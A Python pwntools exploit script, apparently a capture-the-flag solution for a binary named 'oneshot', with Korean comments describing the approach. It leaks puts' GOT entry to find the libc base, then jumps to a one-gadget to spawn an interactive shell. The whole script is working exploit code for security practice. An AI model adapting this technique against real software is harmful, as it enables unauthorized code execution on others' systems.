#! -*- coding: utf-8 -*-
from pwn import *

p = process("./oneshot")

# 64비트 바이너리, NX만 걸려있는 상태. 
# 프로그램 실행하면 read location 이라고 물어보고 입력을 받는다. 
# 입력받는 서식문자는 ld , 16비트 정수 형태. 유효하지 않은 값 입력시 에러
# 그 다음 jump location 을 수행. 마찬가지로 유효하지 않은 값 입력시 에러
# 라이브러리 주소를 leak 하고 one-shot 가젯을 활용하게끔 하자.
# puts 함수의 got를 출력하고 오프셋을 계산, libc를 찾아낸다. 
# 그다음 원샷 가젯의 오프셋을 계산해 넣으면 끝난다.
puts_got = 0x600ad8
puts_offset = 0x809c0
one_gadget = [0x4f2c5,0x4f322,0x10a38c]

p.sendlineafter("Read location?",str(puts_got))
sleep(0.5)
print p.recvuntil(": ")
rcv = int(p.recv(18),16)
libc = rcv - puts_offset

log.info("libc addr : "+hex(libc))
one = libc + one_gadget[1]
pause()
p.sendlineafter("location?",str(one))
p.interactive()